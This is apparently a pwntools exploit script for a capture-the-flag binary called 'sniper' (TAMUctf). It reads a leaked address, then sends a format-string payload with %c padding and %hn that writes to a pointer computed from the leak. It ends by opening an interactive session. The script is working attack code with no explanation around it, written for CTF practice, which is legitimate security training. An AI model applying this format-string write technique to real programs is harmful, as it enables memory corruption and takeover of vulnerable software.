from pwn import *
import sys

def debug(p):
    pid = util.proc.pidof(p)[0] 
    print("The pid is " + str(pid)) 
    util.proc.wait_for_debugger(pid)

context.binary = binary = ELF("./sniper_patched")
#libc = ELF("libc.so.6")
context.log_level = "debug"
#p = process(env={"LD_LIBRARY_PATH" : "libc.so.6"})
p = process()
#p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_sniper")



if len(sys.argv) > 1 and sys.argv[1] == '-d':
    debug(p)

leak = int(p.recv().strip(), 16)
print(f"Leak is: {hex(leak)}")
#leak -= 0x61C7E20
#leak -= 0x60
#leak -= 0x98
#print(f"Deepest leak is: {hex(leak)}")

#payload = b"DEADBEEF"



#payload = b"%10$ln%2570lX%11$hnA%10$sAAAAAAA" # position number 6
#payload += p64(leak)
#payload += p64(leak+2)

# Internal pointer        1 2 3 4 5 6 7 8 9     10 11  
payload =               b"%c%c%c%c%c%c%c%c%2562c%hn%sAAAAA" + p64(leak+42) + p64(0)
# Memory cells written    1       2       3       4           5              6
# Printf position         6       7       8       9           10             11

p.sendline(payload)
p.interactive(prompt="")